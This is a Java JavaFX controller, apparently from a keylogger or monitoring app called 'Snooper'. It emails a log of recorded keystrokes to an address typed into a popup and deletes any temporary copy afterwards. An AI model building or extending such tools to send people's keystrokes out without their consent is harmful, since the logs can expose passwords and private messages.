package com.snooper.app.controller;

import javafx.fxml.FXML;
import javafx.scene.control.*;

import java.io.*;
import com.snooper.tray.*;

import com.snooper.*;

public class EmailPopupController extends Controller {
	
	@FXML private Label filenameLabel;
	@FXML private TextField emailTextField;
	@FXML private Button sendEmailButton;
	
	private SLogFile sLogFile;
	private boolean isTemp = false;
	
	@FXML
	public void initialize() {
		System.out.println("INIT: EmailPopupController.java");
	}
	
	@FXML
	private void sendEmail() {
		String email = emailTextField.getText();
		if (Util.isEmailValid(email)) {
			if (sLogFile.isTemp()) {
				isTemp = true;
				
				File orig = Snooper.getInstance().getKeyStrokesFile();
				sLogFile.copyTo(orig);
				
				sLogFile = new SLogFile(orig);
			}
			
			Util.sendEmailSnoopLog(email, sLogFile);
			
			if (isTemp) {
				sLogFile.getFile().delete();
			}
			
			stage.close();
		}
	}
	
	@Override
	public void send(Object data) {
		if (data instanceof SLogFile) {
			sLogFile = (SLogFile) data;
			
			if (!sLogFile.isTemp()) {
				filenameLabel.setText(sLogFile.getFilename());
			} else {
				filenameLabel.setText(Snooper.getInstance().getKeyStrokesFile().getName());
			}
		}
	}
}